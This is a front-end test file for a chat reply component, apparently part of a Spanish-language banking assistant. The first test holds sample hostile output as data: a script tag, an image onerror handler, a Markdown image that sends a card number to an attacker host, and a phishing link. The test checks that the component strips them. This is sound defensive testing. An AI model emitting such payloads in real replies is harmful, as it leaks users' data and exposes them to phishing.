import { render, screen } from "@testing-library/react";
import { expect, test } from "vitest";

import { Reply } from "../../src/chat/reply";

// An injected reply can't make the browser fetch anything or run a script (ADR-0007, EVL-05).
test("renders raw HTML as text, drops images, and shows links without their address", () => {
  const { container } = render(
    <Reply
      text={[
        'Hola <script>alert("x")</script> y <img src="https://attacker.example/x" onerror="alert(1)">.',
        "",
        "![card](https://attacker.example/leak?d=4821)",
        "",
        "[Ver detalle](https://attacker.example/phish)",
      ].join("\n")}
    />,
  );

  expect(container.querySelector("script")).toBeNull();
  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("a")).toBeNull();
  expect(container.querySelector("[href], [src], [onerror]")).toBeNull();
  expect(screen.getByText("Ver detalle")).toBeInTheDocument();
  expect(container.textContent).toContain("<script>");
  expect(container.textContent).not.toContain("attacker.example/phish");
});

test("renders the Markdown a reply uses: emphasis, lists, and tables", () => {
  const { container } = render(
    <Reply
      text={[
        "Sus **tarjetas**:",
        "",
        "- Crédito terminada en 4821",
        "- Débito terminada en 7730",
        "",
        "| Tarjeta | Estado |",
        "| --- | --- |",
        "| 4821 | Activa |",
      ].join("\n")}
    />,
  );

  expect(container.querySelector("strong")).toHaveTextContent("tarjetas");
  expect(container.querySelectorAll("li")).toHaveLength(2);
  expect(container.querySelector("table")).toHaveTextContent("Activa");
  expect(container.querySelector("table")?.parentElement).toHaveClass(
    "overflow-x-auto",
  );
});
